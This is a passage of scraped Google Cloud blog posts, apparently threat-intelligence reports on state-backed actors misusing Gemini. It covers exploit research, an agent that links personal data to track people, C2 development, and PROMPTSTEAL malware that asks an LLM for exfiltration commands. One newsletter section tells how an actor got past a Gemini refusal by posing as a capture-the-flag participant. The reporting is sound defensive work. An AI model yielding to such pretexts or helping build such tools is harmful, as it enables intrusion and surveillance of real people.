src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/misuse-of-ai-two-fig7b.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 7: North Korean threat actor\u2019s misuse of Gemini to support their operations</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h5><span style=\"vertical-align: baseline;\">Attempting to Develop Novel Capabilities with AI</span></h5>\n<p><span style=\"vertical-align: baseline;\">UNC4899 (aka PUKCHONG), a North Korean threat actor notable for their use of supply chain compromise, used Gemini for a variety of purposes including developing code, researching exploits, and improving their tooling. The research into vulnerabilities and exploit development likely indicates the group is developing capabilities to target edge devices and modern browsers. We have disabled the threat actor\u2019s accounts. </span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"UNC4899 misuse of Gemini across the attack lifecycle\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/misuse-of-ai-two-fig8a.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 8: UNC4899 (aka PUKCHONG) misuse of Gemini across the attack lifecycle</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--small\n      \n      \n        h-c-grid__col\n        \n        \n        h-c-grid__col--2 h-c-grid__col--offset-5\n      \">\n\n      \n      \n        \n        <img alt=\"misuse of AI 2 ctd\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/misuse-of-ai-two-ctd.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Capture-the-Data: Attempts to Develop a \u201cData Processing Agent\u201d</span></h4>\n<p><span style=\"vertical-align: baseline;\">The use of Gemini by APT42, an Iranian government-backed attacker, </span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/adversarial-misuse-generative-ai?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">reflects the group's focus</span></a><span style=\"vertical-align: baseline;\"> on crafting successful phishing campaigns. In recent activity, APT42 used the text generation and editing capabilities of Gemini to craft material for phishing campaigns, often impersonating individuals from reputable organizations such as prominent think tanks and using lures related to security technology, event invitations, or geopolitical discussions. APT42 also used Gemini as a translation tool for articles and messages with specialized vocabulary, for generalized research, and for continued research into Israeli defense.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">APT42 also attempted to build a \u201cData Processing Agent\u201d, misusing Gemini to develop and test the tool. The agent converts natural language requests into SQL queries to derive insights from sensitive personal data. The threat actor provided Gemini with schemas for several distinct data types in order to perform complex queries such as linking a phone number to an owner, tracking an individual's travel patterns, or generating lists of people based on shared attributes. We have disabled the threat actors\u2019 accounts.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\"><strong>Mitigations</strong></td>\n</tr>\n<tr>\n<td style=\"width: 98.1839%;\"><span style=\"vertical-align: baseline;\">These activities are similar to our findings from January that detailed how bad actors are leveraging Gemini for productivity vs. novel capabilities. We took action against this actor by disabling the assets associated with this actor\u2019s activity and Google DeepMind used these insights to further strengthen our protections against such misuse. Observations have been used to strengthen both classifiers and the model itself, enabling it to refuse to assist with these types of attacks moving forward.</span></td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"APT42\u2019s misuse of Gemini to support operations\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/misuse-of-ai-two-fig9b.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 9: APT42\u2019s misuse of Gemini to support operations</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Code Development: C2 Development and Support for Obfuscation</span></h4>\n<p><span style=\"vertical-align: baseline;\">Threat actors continue to adapt generative AI tools to augment their ongoing activities, attempting to enhance their tactics, techniques, and procedures (TTPs) to move faster and at higher volume. For skilled actors, generative AI tools provide a helpful framework, similar to the use of Metasploit or Cobalt Strike in cyber threat activity. These tools also afford lower-level threat actors the opportunity to develop sophisticated tooling, quickly integrate existing techniques, and improve the efficacy of their campaigns regardless of technical acumen or language proficiency.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">Throughout August 2025, GTIG observed threat activity associated with PRC-backed APT41, utilizing Gemini for assistance with code development. The group has demonstrated a history of targeting a range of operating systems across mobile and desktop devices as well as employing social engineering compromises for their operations. Specifically, the group leverages open forums to both lure victims to exploit-hosting infrastructure and to prompt installation of malicious mobile applications.</span></p>\n<p><span style=\"vertical-align: baseline;\">In order to support their campaigns, the actor was seeking out technical support for C++ and Golang code for multiple tools including a C2 framework called OSSTUN by the actor. The group was also observed prompting Gemini for help with code obfuscation, with prompts related to two publicly available obfuscation libraries.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"APT41 misuse of Gemini to support operations\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/misuse-of-ai-two-fig10b.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 10: APT41 misuse of Gemini to support operations</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><hr />\n<p><strong>Information Operations and Gemini</strong></p>\n<p><span style=\"vertical-align: baseline;\">GTIG continues to observe IO actors utilize Gemini for research, content creation, and translation, which aligns with their previous use of Gemini to support their malicious activity. We have identified Gemini activity that indicates threat actors are soliciting the tool to help create articles or aid them in building tooling to automate portions of their workflow. However, we have not identified these generated articles in the wild, nor identified evidence confirming the successful automation of their workflows leveraging this newly built tooling. None of these attempts have created breakthrough capabilities for IO campaigns.</span></p>\n<hr /></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\"><strong>Mitigations</strong></td>\n</tr>\n<tr>\n<td style=\"width: 98.1839%;\"><span style=\"vertical-align: baseline;\">For observed IO campaigns, we did not see evidence of successful automation or any breakthrough capabilities. These activities are similar to our findings from January that detailed how bad actors are leveraging Gemini for productivity vs. novel capabilities. We took action against this actor by disabling the assets associated with this actor\u2019s activity and Google DeepMind used these insights to further strengthen our protections against such misuse. Observations have been used to strengthen both classifiers and the model itself, enabling it to refuse to assist with these types of attacks moving forward.</span></td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Building AI Safely and Responsibly\u00a0</span></h3>\n<p><span style=\"vertical-align: baseline;\">We believe our approach to AI must be both bold and responsible. That means developing AI in a way that maximizes the positive benefits to society while addressing the challenges. Guided by our </span><a href=\"https://ai.google/responsibility/responsible-ai-practices/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI Principles</span></a><span style=\"vertical-align: baseline;\">, Google designs AI systems with robust security measures and strong safety guardrails, and we continuously test the security and safety of our models to improve them.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">Our </span><a href=\"https://gemini.google/policy-guidelines/?hl=en\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">policy guidelines</span></a><span style=\"vertical-align: baseline;\"> and prohibited use </span><a href=\"https://policies.google.com/terms/generative-ai/use-policy\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">policies</span></a><span style=\"vertical-align: baseline;\"> prioritize safety and responsible use of Google's generative AI tools. Google's </span><a href=\"https://transparency.google/our-approach/our-policy-process/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">policy development process</span></a><span style=\"vertical-align: baseline;\"> includes identifying emerging trends, thinking end-to-end, and designing for safety. We continuously enhance safeguards in our products to offer scaled protections to users across the globe.\u00a0\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">At Google, </span><a href=\"https://cloud.google.com/transform/how-google-does-it-threat-intelligence-uncover-track-cybercrime\"><span style=\"text-decoration: underline; vertical-align: baseline;\">we leverage threat intelligence to disrupt</span></a><span style=\"vertical-align: baseline;\"> adversary operations. We investigate abuse of our products, services, users, and platforms, including malicious cyber activities by government-backed threat actors, and work with law enforcement when appropriate. Moreover, our learnings from countering malicious activities are fed back into our product development to improve safety and security for our AI models. These changes, which can be made to both our classifiers and at the model level, are essential to maintaining agility in our defenses and preventing further misuse.</span></p>\n<p><span style=\"vertical-align: baseline;\">Google DeepMind also develops threat models for generative AI to identify potential vulnerabilities, and creates new evaluation and training techniques to address misuse. In conjunction with this research, Google DeepMind has shared how they're actively deploying defenses in AI systems, along with measurement and monitoring tools, including a robust evaluation framework that can automatically red team an AI vulnerability to indirect prompt injection attacks.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">Our AI development and Trust &amp; Safety teams also work closely with our threat intelligence, security, and modelling teams to stem misuse.</span></p>\n<p><span style=\"vertical-align: baseline;\">The potential of AI, especially generative AI, is immense. As innovation moves forward, the industry needs security standards for building and deploying AI responsibly. That's why we introduced the </span><a href=\"https://blog.google/technology/safety-security/introducing-googles-secure-ai-framework/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Secure AI Framework (SAIF)</span></a><span style=\"vertical-align: baseline;\">, a conceptual framework to secure AI systems. We've shared a comprehensive </span><a href=\"https://ai.google.dev/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">toolkit for developers</span></a><span style=\"vertical-align: baseline;\"> with </span><a href=\"https://ai.google.dev/responsible\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">resources and guidance</span></a><span style=\"vertical-align: baseline;\"> for designing, building, and evaluating AI models responsibly. We've also shared best practices for </span><a href=\"https://ai.google.dev/responsible/docs/safeguards\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">implementing safeguards</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://ai.google.dev/responsible/docs/evaluation#red-teaming\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">evaluating model safety</span></a><span style=\"vertical-align: baseline;\">, and </span><a href=\"https://blog.google/technology/safety-security/googles-ai-red-team-the-ethical-hackers-making-ai-safer/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">red teaming</span></a><span style=\"vertical-align: baseline;\"> to test and secure AI systems.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">Google also continuously invests in AI research, helping to ensure </span><a href=\"https://ai.google/static/documents/ai-responsibility-update-published-february-2025.pdf\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI is built responsibly</span></a><span style=\"text-decoration: underline; vertical-align: baseline;\">, </span><span style=\"vertical-align: baseline;\">and that we\u2019re leveraging its potential to automatically find risks. Last year, we introduced </span><a href=\"https://blog.google/technology/safety-security/cybersecurity-updates-summer-2025/\" rel=\"noopener\" target=\"_blank\"><span style=\"vertical-align: baseline;\">Big Sleep</span></a><span style=\"vertical-align: baseline;\">, an AI agent developed by Google DeepMind and Google Project Zero, that actively searches and finds unknown security vulnerabilities in software. Big Sleep has since found its first real-world security vulnerability and assisted in finding a vulnerability that was imminently going to be used by threat actors, which GTIG was able to cut off beforehand. We\u2019re also experimenting with AI to not only find vulnerabilities, but also patch them. We recently introduced </span><a href=\"https://deepmind.google/discover/blog/introducing-codemender-an-ai-agent-for-code-security/\" rel=\"noopener\" target=\"_blank\"><span style=\"vertical-align: baseline;\">CodeMender</span></a><span style=\"vertical-align: baseline;\">, an experimental AI-powered agent utilizing the advanced reasoning capabilities of our Gemini models to automatically fix critical code vulnerabilities.</span><span style=\"text-decoration: underline; vertical-align: baseline;\">\u00a0</span></p>\n<h3><span style=\"vertical-align: baseline;\">About the Authors</span></h3>\n<p><span style=\"vertical-align: baseline;\">Google Threat Intelligence Group focuses on identifying, analyzing, mitigating, and eliminating entire classes of cyber threats against Alphabet, our users, and our customers. Our work includes countering threats from government-backed attackers, targeted zero-day exploits, coordinated information operations (IO), and serious cyber crime networks. We apply our intelligence to improve Google's defenses and protect our users and customers.\u00a0</span></p></div>",
        "published_date": "2025-11-05 14:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/identity-security/cloud-ciso-perspectives-recent-advances-in-how-threat-actors-use-ai-tools/",
        "title": "Cloud CISO Perspectives: Recent advances in how threat actors use AI tools",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/Cloud_CISO_Perspectives_header_4_Blue.max-600x600.png",
        "author": "Sandra Joyce",
        "track": null,
        "description": "<div class=\"block-paragraph\"><p>Welcome to the first Cloud CISO Perspectives for November 2025. Today, Sandra Joyce, vice-president, Google Threat Intelligence, updates us on the state of the adversarial misuse of AI.</p><p>As with all Cloud CISO Perspectives, the contents of this newsletter are posted to the <a href=\"https://cloud.google.com/blog/products/identity-security/\">Google Cloud blog</a>. If you\u2019re reading this on the website and you\u2019d like to receive the email version, you can <a href=\"https://cloud.google.com/resources/google-cloud-ciso-newsletter-signup\">subscribe here</a>.</p></div>\n<div class=\"block-aside\"><dl>\n    <dt>aside_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;title&#x27;, &#x27;Get vital board insights with Google Cloud&#x27;), (&#x27;body&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe16cf377f0&gt;), (&#x27;btn_text&#x27;, &#x27;Visit the hub&#x27;), (&#x27;href&#x27;, &#x27;https://cloud.google.com/solutions/security/board-of-directors?utm_source=cloud_sfdc&amp;utm_medium=email&amp;utm_campaign=FY24-Q2-global-PROD941-physicalevent-er-CEG_Boardroom_Summit&amp;utm_content=-&amp;utm_term=-&#x27;), (&#x27;image&#x27;, &lt;GAEImage: GCAT-replacement-logo-A&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph\"><h3>Recent advances in how threat actors use AI tools</h3><p><i>By Sandra Joyce, vice-president, Google Threat Intelligence</i></p></div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"Sandra Joyce\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/2022_S_Joyce_Headshot.max-1000x1000.jpg\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Sandra Joyce, vice-president, Google Threat Intelligence</p></figcaption>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p>As defenders have made significant advances in using AI to boost their efforts this year, government-backed threat actors and cybercriminals have been trying to do the same. Google Threat Intelligence Group (GTIG) has observed threat actors moving beyond using AI solely for productivity gains: They\u2019re experimenting with <b>deploying novel AI-enabled malware in active operations</b>.</p><p>This shift marks a new phase in how threat actors use AI, shifting from experimentation to wider takeup of tools. It follows our analysis on the <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/adversarial-misuse-generative-ai\">adversarial misuse of generative AI</a>, where we found that, up until the point when we published the report in January, threat actors were using Gemini mostly for productivity gains.</p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-pull_quote\"><div class=\"uni-pull-quote h-c-page\">\n  <section class=\"h-c-grid\">\n    <div class=\"uni-pull-quote__wrapper h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n      <div class=\"uni-pull-quote__inner-wrapper h-c-copy h-c-copy\">\n        <q class=\"uni-pull-quote__text\">At Google, we are committed to developing AI responsibly and are taking proactive steps to disrupt malicious activity, disabling the projects and accounts associated with these threat actors.</q>\n\n        \n      </div>\n    </div>\n  </section>\n</div>\n\n</div>\n<div class=\"block-paragraph\"><p>Based on GTIG\u2019s unique visibility into the misuse of AI tools and the broader threat landscape, the new report details four key findings on how government-backed threat actors and cybercriminals are integrating AI across their entire attack lifecycle. By understanding how adversaries are innovating with AI, security leaders can get ahead of threats and take proactive measures to update their security posture against a changing threat landscape.</p><p><b>1. AI generating commands to steal documents and data</b></p><p>For the first time, GTIG has identified malware families that use large language models (LLMs) during execution. These tools can dynamically generate malicious scripts, use self-modification to obfuscate their own code to evade detection, and receive commands from AI models rather than traditional command-and-control (C2) servers.</p><p>One such new malware detailed in the full report is a data miner we track as PROMPTSTEAL. In June, GTIG identified the Russian government-backed actor APT28 (also known as FROZENLAKE) using PROMPTSTEAL, which masquerades as an image generation program that guides the user through a series of prompts to generate images.</p><p>In the background, PROMPSTEAL queries the API for Hugging Face, a platform for open-source machine learning including LLMs, to generate commands for execution, rather than hard-coding commands in the malware. The prompt specifically asks the LLM to output commands to gather system information, to copy documents to a specified directory, and to exfiltrate data.</p><p>Our analysis indicates continued development of this malware, with new samples adding obfuscation and changing the C2 method.</p><p>FROZENLAKE\u2019s use of PROMPTSTEAL constitutes <b>our first observation of malware querying a LLM deployed in live operations</b>. Combined with other recent experimental implementations of novel AI techniques, this campaign provides an early indicator of how threats are evolving and how adversaries can potentially integrate AI capabilities into future intrusion activity.</p></div>\n<div class=\"block-paragraph\"><p><b>What Google is doing</b>: Google has taken action against this actor by disabling the assets associated with their activity. Google DeepMind has also used these insights to further strengthen our protections against misuse by strengthening both Google\u2019s classifiers and the model itself. This enables the model to refuse to assist with these types of attacks moving forward.</p><p><b>2. Social engineering to bypass safeguards</b></p><p>Threat actors have been adopting social engineering pretexts in their prompts to bypass AI safeguards. We observed actors posing as cybersecurity researchers and as students in capture-the-flag (CTF) competitions to persuade Gemini to provide information that would otherwise receive a safety response from Gemini.</p><p>In one interaction, a threat actor asked Gemini to identify vulnerabilities on a compromised system, but received a safety response from Gemini that a detailed response would not be safe. They reframed the prompt by depicting themselves as a participant in a CTF exercise, and in response Gemini returned helpful information that could be misused to exploit the system.</p><p>The threat actor appeared to learn from this interaction and continued to use the CTF pretext over several weeks in support of phishing, exploitation, and webshell development.</p><p><b>What Google is doing</b>: We took action against the CTF threat actor by disabling the assets associated with the actor\u2019s activity. Google DeepMind was able to use these insights to further strengthen our protections against misuse. Observations have been used to strengthen both classifiers and the model itself, enabling it to refuse to assist with these types of attacks moving forward.</p><p><b>3. Maturing cybercrime marketplace for AI tooling</b></p><p>In addition to misusing mainstream AI-enabled tools and services, there is a growing interest and marketplace for purpose-built AI tools and services that can enable illicit activities. To identify evolving threats, GTIG tracks posts and advertisements on underground forums related to AI tools and services as well as discussions surrounding the technology.</p><p>Many underground forum advertisements mirror language comparable to marketing for legitimate AI models, citing the need to improve the efficiency of workflows and effort while simultaneously offering guidance for prospective customers interested in their offerings.</p><p>The underground marketplace for illicit AI tools has matured in 2025. GTIG has <a href=\"https://www.buzzsprout.com/1762840/episodes/17689432-ai-tools-and-sentiment-within-the-underground-cyber-crime-community\" target=\"_blank\">identified multiple offerings</a> of multifunctional tools designed to support phishing, malware development, vulnerability research, and other capabilities. This development has lowered the barrier to entry for less sophisticated, poorly-resourced threat actors.</p><p><b>What Google is doing</b>: While there are no direct mitigations to prevent threat actors from developing their own AI tools, at Google we <a href=\"https://cloud.google.com/transform/how-google-does-it-threat-intelligence-uncover-track-cybercrime?e=48754805\">use threat intelligence to disrupt adversary operations</a> \u2014 including monitoring the cybercrime AI tool marketplace.</p><p><b>4. Continued augmentation of the full attack lifecycle</b></p><p>State-sponsored actors from North Korea, Iran, and the People's Republic of China (PRC) continue to misuse AI to enhance all stages of their operations, from reconnaissance and phishing lure creation to C2 development and data exfiltration.</p><p>In one example, GTIG observed a suspected PRC-nexus actor using Gemini to support multiple stages of an intrusion campaign, including conducting initial reconnaissance on targets, researching phishing techniques to deliver payloads, soliciting assistance from Gemini related to lateral movement, seeking technical support for C2 efforts once inside a victim\u2019s system, and helping with data exfiltration.</p><p><b>What Google is doing</b>: GTIG takes a holistic, intelligence-driven approach to detecting and disrupting threat activity. Our understanding of government-backed threat actors and their campaigns can help provide the needed context to identify threat-enabling activity. By tracking this activity, we\u2019re able to leverage our insights to counter threats across Google platforms, including disrupting the activity of threat actors who have misused Gemini.</p><p>Our learnings from countering malicious activities are fed back into our product development to improve safety and security for our AI models. Google DeepMind was able to use these insights to further strengthen our protections against misuse. Observations have been used to strengthen both classifiers and the model itself, enabling it to refuse to assist with these types of attacks moving forward.</p><p><b>Building AI safely and responsibly</b></p><p>At Google, we are committed to developing AI responsibly and are taking proactive steps to disrupt malicious activity, disabling the projects and accounts associated with these threat actors. In addition to taking action against accounts, we have proactively fed the intelligence back into our teams and products to better protect Google and its users. We continuously improve our models to make them less susceptible to misuse, and share our findings to arm defenders and enable stronger protections across the ecosystem.</p><p>We believe our approach to AI must be both bold and responsible. That means developing AI in a way that maximizes the positive benefits to society while addressing the challenges. Guided by our <a href=\"https://ai.google/responsibility/responsible-ai-practices/\" target=\"_blank\">AI Principles</a>, Google designs AI systems with robust security measures and strong safety guardrails, and we <a href=\"https://deepmind.google/discover/blog/advancing-geminis-security-safeguards/\" target=\"_blank\">continuously test</a> the security and safety of our models to improve them.</p><p>For more on these shifting behaviors, along with the steps we\u2019ve taken to thwart these efforts, you can read <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/threat-actor-usage-of-ai-tools\">GTIG AI Threat Tracker: Advances in Threat Actor Usage of AI Tools here</a>.</p></div>\n<div class=\"block-aside\"><dl>\n    <dt>aside_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;title&#x27;, &#x27;Tell us what you think&#x27;), (&#x27;body&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe16cf37340&gt;), (&#x27;btn_text&#x27;, &#x27;Join the conversation&#x27;), (&#x27;href&#x27;, &#x27;https://google.qualtrics.com/jfe/form/SV_2n82k0LeG4upS2q&#x27;), (&#x27;image&#x27;, &lt;GAEImage: GCAT-replacement-logo-A&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph\"><h3><b>In case you missed it</b></h3><p>Here are the latest updates, products, services, and resources from our security teams so far this month:</p><ul><li><b>How Google Does It: Threat modeling, from basics to AI</b>: Threat modeling plays a critical role at Google in how we detect and respond to threats \u2014 and secure our use of the public cloud. <a href=\"https://cloud.google.com/transform/how-google-does-it-threat-modeling-from-basics-to-ai/\"><b>Read more</b></a>.</li><li><b>How rapid threat models inject more reality into tabletops</b>: Using rapid threat models in tabletop exercises can help you better understand how defense should adapt to the dynamic threat environment. <a href=\"https://cloud.google.com/transform/how-rapid-threat-models-inject-more-reality-into-tabletops/\"><b>Read more</b></a>.</li><li><b>How we're helping customers prepare for a quantum-safe future</b>: Google has been working on quantum-safe computing for nearly a decade. Here\u2019s our latest on protecting data in transit, digital signatures, and public key infrastructure. <a href=\"https://cloud.google.com/blog/products/identity-security/how-were-helping-customers-prepare-for-a-quantum-safe-future\"><b>Read more</b></a>.</li><li><b>HTTPS by default coming to Chrome</b>: One year from now, with the release of Chrome 154 in October 2026, we will change the default settings of Chrome to enable \u201cAlways Use Secure Connections\u201d. This means Chrome will ask for the user's permission before the first access to any public site without HTTPS. <a href=\"https://security.googleblog.com/2025/10/https-by-default.html\" target=\"_blank\"><b>Read more</b></a>.</li><li><b>How AI helps Android keep you safe from mobile scams</b>: For years, Android has been on the frontlines in the battle against scammers, using the best of Google AI to build proactive, layered protections that can anticipate and block scams before they reach you. <a href=\"https://security.googleblog.com/2025/10/how-android-protects-you-from-scams.html\" target=\"_blank\"><b>Read more</b></a>.</li></ul><p>Please visit the Google Cloud blog for more security stories <a href=\"https://cloud.google.com/blog/products/identity-security\">published this month</a>.</p></div>\n<div class=\"block-aside\"><dl>\n    <dt>aside_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;title&#x27;, &#x27;Join the Google Cloud CISO Community&#x27;), (&#x27;body&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe16cf37fd0&gt;), (&#x27;btn_text&#x27;, &#x27;Learn more&#x27;), (&#x27;href&#x27;, &#x27;https://rsvp.withgoogle.com/events/ciso-community-interest?utm_source=cgc-blog&amp;utm_medium=blog&amp;utm_campaign=2024-cloud-ciso-newsletter-events-ref&amp;utm_content=-&amp;utm_term=-&#x27;), (&#x27;image&#x27;, &lt;GAEImage: GCAT-replacement-logo-A&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph\"><h3><b>Threat Intelligence news</b></h3><ul><li><b>A defender's guide to privileged account monitoring</b>: Privileged access stands as the most critical pathway for adversaries seeking to compromise sensitive systems and data. This guide can help you protect the proverbial keys to your kingdom with recommendations and insights to prevent, detect, and respond to intrusions targeting privileged accounts. <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/privileged-account-monitoring\"><b>Read more</b></a><b>.</b></li><li><b>Pro-Russia information operations leverage Russian drone incursions into Polish airspace</b>: GTIG has observed multiple instances of pro-Russia information operations (IO) actors promoting narratives related to the reported incursion of Russian drones into Polish airspace that occurred in September. The IO activity appeared consistent with previously-observed instances of pro-Russia IO targeting Poland \u2014 and more broadly the NATO Alliance and the West. <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/pro-russia-information-operations-drone-incursions\"><b>Read more</b></a><b>.</b></li><li><b>Vietnamese actors using fake job posting campaigns to deliver malware and steal credentials</b>: GTIG is tracking a cluster of financially-motivated threat actors operating from Vietnam that use fake job postings on legitimate platforms to target individuals in the digital advertising and marketing sectors. <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/vietnamese-actors-fake-job-posting-campaigns\"><b>Read more</b></a><b>.</b></li></ul><p>Please visit the Google Cloud blog for more threat intelligence stories <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/\">published this month</a>.</p></div>\n<div class=\"block-paragraph\"><h3><b>Now hear this: Podcasts from Google Cloud</b></h3><ul><li><b>The end of \u2018collect everything\u2019: Moving from centralization to data access</b>: Will the next big SIEM and SOC cost-savings come from managing security data access? Balazs Scheidler, CEO, Axoflow, and founder of syslog-ng, debates the future of security data with hosts Anton 